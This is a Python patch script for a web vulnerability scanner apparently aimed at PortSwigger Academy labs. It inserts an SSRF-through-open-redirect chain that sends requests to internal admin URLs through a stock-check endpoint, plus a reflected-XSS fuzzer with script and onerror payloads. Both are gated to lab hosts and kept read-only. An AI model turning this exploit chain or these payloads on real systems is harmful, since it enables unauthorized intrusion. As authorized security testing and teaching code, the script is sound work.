#!/usr/bin/env python3
"""
fix_and_patch.py — Safely restore + patch satria_engine in one go.

What it does:
  1. Detects the current state of satria_engine.py (the file app.py imports)
  2. If configure_runtime is missing, uses satria_engine (6).py as the source of truth
  3. Applies SSRF + XSS detection fixes using AST (not fragile string matching)
  4. Verifies the module imports successfully AND has all expected attributes
  5. Only writes the file if all checks pass (otherwise restores backup)

Usage:
    # In your repo root (/mount/src/satria/ for Streamlit Cloud)
    python fix_and_patch.py
"""
import ast
import re
import shutil
import subprocess
import sys
from pathlib import Path
from typing import Optional, Tuple

TARGET_FILE = Path("satria_engine.py")
SOURCE_FILE = Path("satria_engine (6).py")
BACKUP_SUFFIX = ".bak"

# ═══════════════════════════════════════════════════════════════════════════
# AST-based function replacement — safer than string matching
# ═══════════════════════════════════════════════════════════════════════════

def find_function_range(source: str, func_name: str) -> Optional[Tuple[int, int]]:
    """Return (start_line_0idx, end_line_0idx_exclusive) for the LAST def of func_name."""
    try:
        tree = ast.parse(source)
    except SyntaxError as e:
        raise RuntimeError(f"Source has syntax error at line {e.lineno}: {e.msg}") from e
    matches = []
    for node in ast.walk(tree):
        if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)) and node.name == func_name:
            start = node.lineno - 1
            if node.decorator_list:
                start = min(d.lineno - 1 for d in node.decorator_list)
            end = node.end_lineno  # 1-indexed inclusive
            matches.append((start, end))
    if not matches:
        return None
    # Return the LAST match (highest precedence at module level)
    return matches[-1]


def replace_function(source: str, func_name: str, new_source: str) -> str:
    """Replace the last definition of func_name with new_source."""
    rng = find_function_range(source, func_name)
    if rng is None:
        raise RuntimeError(f"Function {func_name!r} not found in source")
    start, end = rng
    lines = source.split("\n")
    new_lines = lines[:start] + [new_source.rstrip("\n")] + lines[end:]
    return "\n".join(new_lines)


# ═══════════════════════════════════════════════════════════════════════════
# Verification helpers
# ═══════════════════════════════════════════════════════════════════════════

REQUIRED_ATTRS = [
    "configure_runtime",
    "run_pipeline",
    "run_active_scanning",
    "run_ssrf_open_redirect_chain_analyzer",
    "feature_param_fuzzing",
    "run_sql_injection_analyzer",
    "render_pdf",
]


def verify_source(source: str, label: str) -> None:
    """Verify source compiles and contains all required functions."""
    try:
        ast.parse(source)
    except SyntaxError as e:
        raise RuntimeError(f"[{label}] Syntax error: line {e.lineno}: {e.msg}")
    tree = ast.parse(source)
    func_names = set()
    for node in ast.walk(tree):
        if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
            func_names.add(node.name)
    missing = [a for a in REQUIRED_ATTRS if a not in func_names]
    if missing:
        raise RuntimeError(f"[{label}] Missing functions: {missing}")
    print(f"  [{label}] ✓ Syntax OK, all {len(REQUIRED_ATTRS)} required functions present")


def import_check(path: Path) -> None:
    """Actually import the module in a subprocess and check attributes."""
    script = (
        "import importlib.util, sys;"
        f"spec = importlib.util.spec_from_file_location('_test_engine', {str(path)!r});"
        "mod = importlib.util.module_from_spec(spec);"
        "spec.loader.exec_module(mod);"
        f"missing = [a for a in {REQUIRED_ATTRS!r} if not hasattr(mod, a)];"
        "assert not missing, f'missing attrs: {missing}';"
        "print('OK: all required attrs present')"
    )
    result = subprocess.run(
        [sys.executable, "-c", script],
        capture_output=True, text=True, timeout=120,
    )
    if result.returncode != 0:
        raise RuntimeError(
            f"Import check failed:\nSTDOUT: {result.stdout[-2000:]}\nSTDERR: {result.stderr[-2000:]}"
        )
    # Filter out the module's own print() output; keep only our marker
    if "OK: all required attrs present" not in result.stdout:
        raise RuntimeError(f"Import check returned unexpected output:\n{result.stdout[-2000:]}")
    print(f"  [import] ✓ Module imports successfully with all required attributes")


# ═══════════════════════════════════════════════════════════════════════════
# New function bodies (copy from previous fix, with all fixes)
# ═══════════════════════════════════════════════════════════════════════════

NEW_SSRF_BODY = r'''def run_ssrf_open_redirect_chain_analyzer(target_url, html, crawled_urls=None, crawled_forms=None):
    """Run a bounded, read-only SSRF/open-redirect chain check for the Academy lab.

    No internal URL is requested directly by the scanner. The only internal path is
    supplied to the known Academy stock-check feature after same-origin open redirect
    behavior is independently observed. The chain ends at GET /admin; no mutation,
    deletion, credential access, or other admin action is performed.
    """
    out = {
        "enabled": bool(SATRIA_SSRF_OPEN_REDIRECT_CHAIN_V1),
        "status": "NOT_ASSESSED",
        "requests_sent": 0,
        "open_redirect": {"status": "NOT_TESTED", "evidence": ""},
        "ssrf_chain": {"status": "NOT_TESTED", "evidence": ""},
        "finding": None,
        "notes": [],
    }
    if not _satria_ps_is_lab(target_url):
        out["status"] = "SKIPPED_NON_ACADEMY_TARGET"
        out["notes"].append("Rantai SSRF internal khusus lab tidak dijalankan pada target umum.")
        return out
    if not RUN_PORTSWIGGER_COVERAGE:
        out["status"] = "SKIPPED_DISABLED_BY_OPERATOR"
        out["notes"].append("Modul PortSwigger coverage dinonaktifkan oleh operator; tidak ada request tambahan.")
        return out
    if not active_probe_enabled():
        out["status"] = "SKIPPED_AUTHORIZATION_REQUIRED"
        out["notes"].append("Gerbang otorisasi active scan belum aktif; tidak ada request tambahan.")
        return out

    next_product_url = _satria_ssrf_path_candidate(crawled_urls)
    stock_endpoint = _satria_ssrf_stock_endpoint(target_url, crawled_forms, html)

    if not next_product_url:
        for probed in (
            "/product/nextProduct?currentProductId=1&path=/product?productId=2",
            "/product/nextProduct?currentProductId=1&path=/product?productId=1",
            "/product/nextProduct?currentProductId=2&path=/product?productId=3",
        ):
            try:
                probe_r = requests.get(urljoin(target_url, probed), headers=HEADERS,
                                       timeout=SATRIA_SSRF_CHAIN_TIMEOUT,
                                       allow_redirects=False, verify=True)
                out["requests_sent"] += 1
                if int(probe_r.status_code) in {301, 302, 303, 307, 308}:
                    next_product_url = urljoin(target_url, probed)
                    break
            except Exception:
                continue
    if not stock_endpoint:
        for probed in ("/product/stock", "/stock"):
            try:
                probe_r = requests.options(urljoin(target_url, probed), headers=HEADERS,
                                           timeout=SATRIA_SSRF_CHAIN_TIMEOUT,
                                           allow_redirects=False, verify=True)
                out["requests_sent"] += 1
                status = int(probe_r.status_code)
                if status != 404 and status < 500:
                    stock_endpoint = urljoin(target_url, probed)
                    break
            except Exception:
                continue

    if not next_product_url or not stock_endpoint:
        out["status"] = "LAB_WORKFLOW_ENDPOINTS_NOT_DISCOVERED"
        out["open_redirect"].update({
            "status": "NOT_ASSESSED",
            "evidence": "Endpoint /product/nextProduct?path=... tidak ditemukan pada URL crawl maupun fallback probe.",
        })
        out["ssrf_chain"].update({
            "status": "NOT_ASSESSED",
            "evidence": "Endpoint POST /product/stock tidak ditemukan pada crawler/page source maupun fallback.",
        })
        out["notes"].append("Perlu crawl halaman produk dan tombol Check stock / Next product agar alur lab terpetakan.")
        return out

    nonce = "satria-redirect-" + _satria_ps_uuid.uuid4().hex[:12]
    marker_url = "https://%s.invalid/%s" % (nonce, nonce)
    redirect_confirmed = False
    current_id = "1"
    try:
        parsed = urlparse(next_product_url)
        query = parse_qs(parsed.query, keep_blank_values=True)
        current_id = next((str(v[0]) for k, v in query.items()
                           if k.lower() == "currentproductid" and v), "1")
        query["currentProductId"] = [current_id]
        query["path"] = [marker_url]
        redirect_probe_url = urlunparse(parsed._replace(query=urlencode(query, doseq=True)))
        if not _satria_ps_same_origin(redirect_probe_url, target_url):
            raise ValueError("Open-redirect probe URL keluar dari origin target.")
        redirect_response = requests.get(
            redirect_probe_url, headers=HEADERS, timeout=SATRIA_SSRF_CHAIN_TIMEOUT,
            allow_redirects=False, verify=True,
        )
        out["requests_sent"] += 1
        location = str((getattr(redirect_response, "headers", {}) or {}).get("Location", "") or "")
        location_url = urljoin(redirect_probe_url, location) if location else ""
        location_parsed = urlparse(location_url) if location_url else None
        marker_host = urlparse(marker_url).hostname
        redirect_confirmed = bool(
            int(getattr(redirect_response, "status_code", 0)) in {301, 302, 303, 307, 308}
            and location_parsed and (location_parsed.hostname or "").lower() == marker_host
            and nonce in location_url
        )
        out["open_redirect"] = {
            "status": "OPEN_REDIRECT_LOCATION_CONFIRMED" if redirect_confirmed else "OPEN_REDIRECT_NOT_CONFIRMED",
            "http_status": int(getattr(redirect_response, "status_code", 0)),
            "location_host": (location_parsed.hostname if location_parsed else "") or "",
            "evidence": ("GET %s mengembalikan redirect ke marker eksternal pada Location (redirect tidak diikuti)." % parsed.path)
                        if redirect_confirmed else
                        ("Respons endpoint nextProduct tidak mengarahkan Location ke marker eksternal; HTTP %s." % getattr(redirect_response, "status_code", "?")),
        }
        if not redirect_confirmed:
            out["status"] = "OPEN_REDIRECT_NOT_CONFIRMED"
            out["ssrf_chain"].update({
                "status": "NOT_RUN_REDIRECT_PREREQUISITE_MISSING",
                "evidence": "Chain dihentikan karena open redirect belum terkonfirmasi.",
            })
            return out
    except Exception as exc:
        out["open_redirect"].update({"status": "PROBE_ERROR", "evidence": str(exc)[:220]})
        out["status"] = "OPEN_REDIRECT_PROBE_ERROR"
        return out

    internal_candidates = [
        SATRIA_SSRF_CHAIN_INTERNAL_ADMIN_URL,
        "http://192.168.0.12:8080/admin/",
        "http://localhost:8080/admin",
        "http://127.0.0.1:8080/admin",
    ]
    best_signal = None
    for internal_url in internal_candidates:
        try:
            redirect_path = (
                "/product/nextProduct?currentProductId=%s&path=%s"
                % (_satria_ssrf_quote(current_id, safe=""),
                   _satria_ssrf_quote(internal_url, safe=":/"))
            )
            response = requests.post(
                stock_endpoint,
                data={"stockApi": redirect_path},
                headers={
                    **HEADERS,
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Referer": urljoin(target_url, "/product?productId=" + current_id),
                },
                timeout=SATRIA_SSRF_CHAIN_TIMEOUT,
                allow_redirects=False,
                verify=True,
            )
            out["requests_sent"] += 1
            body = _satria_ssrf_response_body(response)
            admin_markers = {
                "carlos_user": bool(re.search(r"\bcarlos\b", body, re.I)),
                "wiener_user": bool(re.search(r"\bwiener\b", body, re.I)),
                "delete_route": bool(re.search(r"/admin/delete(?:\?|['\"\s>]|$)", body, re.I)),
                "users_heading": bool(re.search(r"<h[1-6][^>]*>\s*users\s*</h[1-6]>", body, re.I)),
                "admin_heading": bool(re.search(r"<h[1-6][^>]*>[^<]*\badmin\b", body, re.I)),
                "admin_title": bool(re.search(r"<title[^>]*>[^<]*\badmin\b", body, re.I)),
                "user_table": bool(re.search(r"<table[\s\S]{0,800}?(?:carlos|wiener|/admin/delete)", body, re.I)),
            }
            strong_signal = bool(
                (admin_markers["carlos_user"] and admin_markers["delete_route"])
                or (admin_markers["wiener_user"] and admin_markers["delete_route"])
                or (admin_markers["users_heading"]
                    and (admin_markers["carlos_user"] or admin_markers["wiener_user"]))
                or admin_markers["admin_title"]
                or (admin_markers["admin_heading"]
                    and (admin_markers["carlos_user"] or admin_markers["delete_route"]))
            )
            response_status = int(getattr(response, "status_code", 0))
            candidate_signal = {
                "internal_url": internal_url,
                "status": ("SSRF_REDIRECT_CHAIN_ADMIN_RESPONSE_CANDIDATE" if strong_signal
                           else "SSRF_CHAIN_RESPONSE_NOT_PROVEN"),
                "http_status": response_status,
                "stock_endpoint": urlparse(stock_endpoint).path,
                "admin_markers": admin_markers,
                "response_bytes": len(body),
                "body_snippet": body[:400],
                "evidence": (
                    "POST %s menerima stockApi berupa route same-origin /product/nextProduct; "
                    "respons stock-check memuat indikator halaman /admin internal (markers: %s). "
                    "Tidak ada endpoint delete yang dipanggil."
                    % (urlparse(stock_endpoint).path,
                       ", ".join(k for k, v in admin_markers.items() if v) or "none")
                ) if strong_signal else (
                    "POST %s dikirim dengan stockApi melalui route redirect same-origin "
                    "(internal target: %s); respons HTTP %s tidak memuat indikator halaman admin "
                    "yang cukup untuk membuktikan SSRF chain."
                    % (urlparse(stock_endpoint).path, internal_url, response_status)
                ),
            }
            if strong_signal:
                best_signal = candidate_signal
                break
            if best_signal is None:
                best_signal = candidate_signal
        except Exception as exc:
            best_signal = {
                "internal_url": internal_url,
                "status": "PROBE_ERROR",
                "evidence": str(exc)[:220],
            }
            continue

    if best_signal is None:
        out["ssrf_chain"] = {"status": "PROBE_ERROR",
                             "evidence": "Tidak ada respons stock-check yang dapat diuji."}
        out["status"] = "OPEN_REDIRECT_CONFIRMED_SSRF_CHAIN_ERROR"
        return out

    out["ssrf_chain"] = best_signal
    if best_signal.get("status") == "SSRF_REDIRECT_CHAIN_ADMIN_RESPONSE_CANDIDATE":
        out["status"] = "SSRF_OPEN_REDIRECT_CHAIN_CANDIDATE"
        out["finding"] = {
            "type": "SSRF filter bypass via open redirect (candidate)",
            "severity": "high",
            "cwe": "CWE-918",
            "owasp": "A10:2021 - Server-Side Request Forgery",
            "verification": "candidate_ssrf_open_redirect_chain",
            "evidence": (
                "Open redirect terkonfirmasi: %s. Rantai stock-check juga mengembalikan indikator "
                "halaman admin internal: %s. Bukti dibatasi pada HTTP status/marker halaman; "
                "tidak ada tindakan delete atau perubahan state yang dijalankan."
                % (out["open_redirect"]["evidence"], best_signal.get("evidence", ""))
            ),
            "risk": "Server-side stock checker tampak mengikuti redirect dari URL same-origin menuju "
                    "antarmuka administrasi internal; kontrol allowlist URL dapat dilewati melalui "
                    "open redirect.",
            "recommendation": "Validasi setiap redirect hop setelah resolusi URL, batasi "
                              "protokol/host/IP pada setiap hop, blokir alamat non-public setelah "
                              "DNS resolution, dan nonaktifkan redirect otomatis untuk fetcher "
                              "server-side kecuali destination telah divalidasi ulang.",
        }
    else:
        out["status"] = "OPEN_REDIRECT_CONFIRMED_SSRF_CHAIN_UNPROVEN"
        out["notes"].append("Open redirect terbukti, tetapi respons stock checker belum memberi "
                            "bukti cukup bahwa backend mengikuti redirect ke admin internal.")
    return out
'''

NEW_PARAM_FUZZ_BODY = r'''def feature_param_fuzzing(urls, forms):
    """GET-only reflection + Academy-host XSS payload differential.

    Sends inert markers on any host, and context-breaking XSS payloads only on
    *.web-security-academy.net (isolated per-user labs). Never posts forms,
    never sends cookies.
    """
    observations, candidates, tested = [], [], 0
    marker = "SATRIA_REFLECT_" + _satria_ps_uuid.uuid4().hex[:16]
    is_academy = bool(urls) and _satria_ps_is_lab(urls[0]) and active_probe_enabled()
    xss_payloads = [
        "<script>alert(1)</script>",
        "'\"><script>alert(1)</script>",
        "\"><img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
    ]
    for url in (urls or [])[:8]:
        try:
            parsed = urlparse(str(url))
            if not parsed.query or not parsed.scheme.startswith("http"):
                continue
            if not _satria_ps_same_origin(url, urls[0] if urls else url):
                continue
            original = parse_qs(parsed.query, keep_blank_values=True)
            for key in list(original)[:2]:
                if tested >= 6:
                    break
                injected = {k: list(v) for k, v in original.items()}
                injected[key] = [marker]
                test_url = urlunparse(parsed._replace(query=urlencode(injected, doseq=True)))
                try:
                    response = _satria_ps_request(test_url)
                    tested += 1
                    reflected = marker in _satria_ps_body(response)
                    row = {
                        "url": str(url)[:400],
                        "parameter": str(key)[:120],
                        "status_code": int(response.status_code),
                        "marker_reflected": bool(reflected),
                    }
                    if reflected:
                        candidates.append({
                            "type": "Input reflection observation (not confirmed XSS)",
                            "severity": "info",
                            "verification": "candidate_active_reflection_marker",
                            "evidence": (f"Marker non-eksekutabel direfleksikan pada parameter "
                                         f"{key} di {parsed.path[:160]}."),
                            "risk": "Refleksi tidak membuktikan XSS; konteks output dan encoding harus dianalisis.",
                            "recommendation": "Periksa konteks HTML/atribut/JavaScript dan lakukan validasi manual di lab berizin.",
                        })
                        if is_academy:
                            for payload in xss_payloads[:3]:
                                try:
                                    inj2 = {k: list(v) for k, v in original.items()}
                                    inj2[key] = [payload]
                                    url2 = urlunparse(parsed._replace(query=urlencode(inj2, doseq=True)))
                                    r2 = _satria_ps_request(url2)
                                    tested += 1
                                    body2 = _satria_ps_body(r2)
                                    if payload in body2:
                                        candidates.append({
                                            "type": "Reflected XSS candidate — payload reflected unencoded",
                                            "severity": "high",
                                            "cwe": "CWE-79",
                                            "owasp": "A03:2021 - Injection",
                                            "verification": "candidate_active_reflected_xss",
                                            "evidence": (f"Payload XSS direfleksikan verbatim pada parameter "
                                                         f"'{key}' di {parsed.path[:160]}; "
                                                         f"HTTP {r2.status_code}, body_bytes={len(body2)}."),
                                            "risk": "Payload dapat dieksekusi di browser korban jika konteks tidak di-encode.",
                                            "recommendation": "Validasi manual di browser korban simulasi; "
                                                              "perbaiki dengan context-aware output encoding.",
                                        })
                                        row["xss_payload_reflected"] = True
                                        break
                                except Exception:
                                    continue
                    observations.append(row)
                except Exception as exc:
                    observations.append({
                        "url": str(url)[:300], "parameter": str(key)[:100],
                        "error": str(exc)[:160],
                    })
        except Exception:
            continue

    form_rows = []
    for form in (forms or [])[:80]:
        if not isinstance(form, dict):
            continue
        form_rows.append({
            "url": str(form.get("url") or "")[:300],
            "action": str(form.get("action") or "")[:300],
            "method": str(form.get("method") or "GET").upper(),
            "inputs": list(form.get("inputs") or [])[:30],
            "post_submission": "NOT_SENT_SAFE_POLICY"
                if str(form.get("method", "get")).lower() == "post" else "NOT_NEEDED",
        })
    return {
        "findings": [],
        "candidates": candidates,
        "observations": observations,
        "forms_inventory": form_rows,
        "requests_sent": tested,
        "note": "GET hanya; marker non-eksekutabel; XSS payload aktif hanya di lab Academy.",
    }
'''

NEW_SSRF_PROFILE_BRANCH = '''    elif category == "Server-side request forgery (SSRF)":
        if "open redirection" in n:
            return {
                "coverage_mode": "SAFE_ACTIVE",
                "method": "GET open-redirect verification + read-only POST /product/stock chain ke internal /admin (tidak memanggil /admin/delete).",
                "prerequisites": "Endpoint /product/nextProduct?path= dan POST /product/stock harus ditemukan (crawler atau fallback).",
                "safety": "Hanya GET /admin; tidak ada delete, login, atau perubahan state.",
            }
        return {**common, "method": "Uji URL sink dengan callback domain kontrol; analisis redirect, allowlist dan DNS resolution.",
                "prerequisites": "Parameter URL sink dan OAST milik operator. Tidak melakukan akses localhost/private metadata."}'''


# ═══════════════════════════════════════════════════════════════════════════
# Main
# ═══════════════════════════════════════════════════════════════════════════

def detect_source_file() -> Path:
    """Find the best source file. Prefer a file that has configure_runtime."""
    candidates = []
    if TARGET_FILE.exists():
        candidates.append(TARGET_FILE)
    if SOURCE_FILE.exists():
        candidates.append(SOURCE_FILE)
    for c in candidates:
        try:
            text = c.read_text(encoding="utf-8")
            if "def configure_runtime" in text:
                return c
        except Exception:
            continue
    raise SystemExit(
        "Tidak ada file yang memiliki `def configure_runtime`. "
        "Pastikan satria_engine (6).py ada di direktori kerja, atau "
        "upload ulang file engine lengkap."
    )


def main() -> None:
    print("=" * 60)
    print("SATRIA Engine — Safe Patch + Verify")
    print("=" * 60)

    # Determine source
    source_file = detect_source_file()
    print(f"\n[1/6] Source file: {source_file}")

    # Read source
    source = source_file.read_text(encoding="utf-8")
    print(f"       {len(source):,} chars")

    # Verify source is healthy BEFORE patching
    print(f"\n[2/6] Verifying original source ...")
    verify_source(source, "original")

    # Apply patches via AST (safe)
    print(f"\n[3/6] Applying patches ...")
    try:
        source = replace_function(source, "run_ssrf_open_redirect_chain_analyzer", NEW_SSRF_BODY)
        print("       ✓ Patched run_ssrf_open_redirect_chain_analyzer")
        source = replace_function(source, "feature_param_fuzzing", NEW_PARAM_FUZZ_BODY)
        print("       ✓ Patched feature_param_fuzzing (last definition)")
        # Branch replacement inside _satria_ps_scenario_profile
        old_branch = '''    elif category == "Server-side request forgery (SSRF)":
        return {**common, "method": "Uji URL sink dengan callback domain kontrol; analisis redirect, allowlist dan DNS resolution.",
                "prerequisites": "Parameter URL sink dan OAST milik operator. Tidak melakukan akses localhost/private metadata."}'''
        if old_branch in source:
            source = source.replace(old_branch, NEW_SSRF_PROFILE_BRANCH, 1)
            print("       ✓ Patched SSRF profile branch in _satria_ps_scenario_profile")
        else:
            print("       ! SSRF profile branch not found — skipping (may already be patched)")
    except Exception as e:
        raise SystemExit(f"Patching failed: {e}")

    # Verify patched source
    print(f"\n[4/6] Verifying patched source ...")
    verify_source(source, "patched")

    # Write to a TEMP file first, verify import, then swap
    print(f"\n[5/6] Verifying import (temp file) ...")
    temp_path = source_file.with_name(source_file.stem + "_patched_tmp.py")
    try:
        temp_path.write_text(source, encoding="utf-8")
        import_check(temp_path)
    except Exception as e:
        if temp_path.exists():
            temp_path.unlink()
        raise SystemExit(f"Import verification failed — file NOT modified:\n{e}")

    # Backup + swap
    print(f"\n[6/6] Writing patched file ...")
    backup = source_file.with_suffix(source_file.suffix + BACKUP_SUFFIX)
    if not backup.exists():
        shutil.copy2(source_file, backup)
        print(f"       Backup: {backup}")
    else:
        print(f"       Backup already exists: {backup}")

    # If the source was "satria_engine (6).py", also write to "satria_engine.py"
    # so that app.py (which does `import satria_engine`) picks up the patched version.
    if source_file.name != "satria_engine.py":
        print(f"\n       Copying patched file to satria_engine.py (app.py imports this name) ...")
        if TARGET_FILE.exists() and TARGET_FILE != source_file:
            target_backup = TARGET_FILE.with_suffix(".py.bak")
            if not target_backup.exists():
                shutil.copy2(TARGET_FILE, target_backup)
                print(f"       Backup: {target_backup}")
        TARGET_FILE.write_text(source, encoding="utf-8")
        print(f"       Wrote: {TARGET_FILE}")

    source_file.write_text(source, encoding="utf-8")
    temp_path.unlink()
    print(f"       Wrote: {source_file}")

    print("\n" + "=" * 60)
    print("✓ PATCH COMPLETE")
    print("=" * 60)
    print(f"\nFile(s) modified:")
    if source_file.name != "satria_engine.py" and TARGET_FILE.exists():
        print(f"  - {source_file}")
        print(f"  - {TARGET_FILE}")
    else:
        print(f"  - {source_file}")
    print(f"\nBackup: {backup}")
    print(f"\nNext steps:")
    print(f"  1. Commit changes to your repo (git add / git commit / git push)")
    print(f"  2. Restart Streamlit app (or redeploy)")
    print(f"  3. Scan the SSRF lab again")
    print(f"\nExpected PDF finding (Section 7 — Active Scanning Results):")
    print(f"  Severity: HIGH")
    print(f"  Type: 'SSRF filter bypass via open redirect (candidate)'")
    print(f"  CWE: CWE-918 | OWASP: A10:2021")
    print(f"  Evidence: Open redirect confirmed + stock-check response shows /admin page markers")


if __name__ == "__main__":
    main()
